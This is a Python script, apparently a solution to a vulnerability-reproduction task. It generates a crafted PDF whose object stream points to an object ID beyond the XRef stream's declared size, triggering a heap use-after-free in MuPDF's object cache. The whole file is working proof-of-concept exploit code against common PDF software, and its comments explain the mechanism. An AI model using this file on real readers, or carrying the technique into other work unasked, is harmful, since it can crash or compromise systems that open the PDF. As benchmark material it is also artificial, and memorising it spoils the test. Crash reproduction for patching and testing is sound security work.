import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a PDF that triggers Heap Use-After-Free in MuPDF.
        # The vulnerability occurs when loading an object from an Object Stream.
        # If the Object Stream references an object ID that is outside the current XRef table size,
        # the table is resized (realloc), invalidating pointers held by the caller (pdf_cache_object).
        
        header = b"%PDF-1.5\n\xbd\xbe\xbc\n"
        
        # Object 2 content (Catalog) - resides inside the Object Stream
        obj2_str = b"<</Type/Catalog>>" # Length 17
        
        # Object 1000 content - resides inside the Object Stream
        # We use ID 1000 to force XRef table expansion (Size is 4).
        obj1000_str = b"<</Dummy/Obj>>"
        
        # Object Stream Content Construction
        # Pairs: (ObjID, Offset)
        # We define: 2 at 0, 1000 at 20.
        # Preamble: "2 0 1000 20 "
        preamble = b"2 0 1000 20 "
        
        # /First is 20. Pad preamble to 20 bytes.
        pad1 = b" " * (20 - len(preamble))
        
        # Obj 2 is at relative 0. We need to reach relative 20 for Obj 1000.
        # obj2_str is 17 bytes. 20 - 17 = 3 bytes padding.
        pad2 = b" " * (20 - len(obj2_str))
        
        stm_data = preamble + pad1 + obj2_str + pad2 + obj1000_str
        
        # Object 1: The Object Stream
        obj1 = (
            b"1 0 obj\n"
            b"<< /Type /ObjStm /N 2 /First 20 /Length %d >>\n"
            b"stream\n"
            b"%s\n"
            b"endstream\n"
            b"endobj\n"
        ) % (len(stm_data), stm_data)
        
        offset_obj1 = len(header)
        offset_obj3 = offset_obj1 + len(obj1)
        
        # Object 3: XRef Stream
        # Defines the Cross-Reference Table.
        # /Size 4 sets the initial XRef table size to 4.
        # Accessing object 1000 (from ObjStm) will trigger a resize.
        
        # W [1 2 1] format:
        # Field 1 (1 byte): Type (0=Free, 1=Offset, 2=InObjStm)
        # Field 2 (2 bytes): Offset or ObjStm Number
        # Field 3 (1 byte): Gen or Index
        
        # Entry 0: Free
        e0 = b"\x00\x00\x00\x00"
        
        # Entry 1: Object 1 (The ObjStm). Type 1. Offset = offset_obj1.
        e1 = b"\x01" + struct.pack(">H", offset_obj1) + b"\x00"
        
        # Entry 2: Object 2. Type 2 (In ObjStm). ObjStm = 1. Index = 0.
        # This causes pdf_cache_object(2) to load ObjStm 1.
        e2 = b"\x02\x00\x01\x00"
        
        # Entry 3: Object 3 (The XRef Stream). Type 1. Offset = offset_obj3.
        e3 = b"\x01" + struct.pack(">H", offset_obj3) + b"\x00"
        
        xref_data = e0 + e1 + e2 + e3
        
        obj3 = (
            b"3 0 obj\n"
            b"<< /Type /XRef /Size 4 /W [1 2 1] /Root 2 0 R /Length %d >>\n"
            b"stream\n"
            b"%s\n"
            b"endstream\n"
            b"endobj\n"
        ) % (len(xref_data), xref_data)
        
        footer = (
            b"startxref\n"
            b"%d\n"
            b"%%%%EOF\n"
        ) % offset_obj3
        
        return header + obj1 + obj3 + footer